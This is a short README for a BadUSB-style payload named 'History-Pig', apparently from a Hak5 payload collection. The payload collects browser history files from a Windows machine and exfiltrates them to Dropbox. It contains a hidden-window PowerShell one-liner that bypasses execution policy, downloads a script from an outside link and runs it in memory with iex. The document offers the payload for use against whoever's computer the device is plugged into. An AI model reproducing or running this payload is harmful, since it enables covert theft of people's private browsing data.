# History-Pig

A payload to exfiltrate the history of the 2 most popular browsers

## Description

This payload will enumerate through the browser directories, looking for the file that stores the history

These files will be saved to the temp directory

Finally dropbox will be used to exfiltrate the files to cloud storage

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl

## Contributing

All contributors names will be listed here

atomiczsec
I am Jakoby

## Version History

* 0.1
    * Initial Release

## Acknowledgments

* [Hak5](https://hak5.org/)
* [I-Am-Jakoby](https://github.com/I-Am-Jakoby)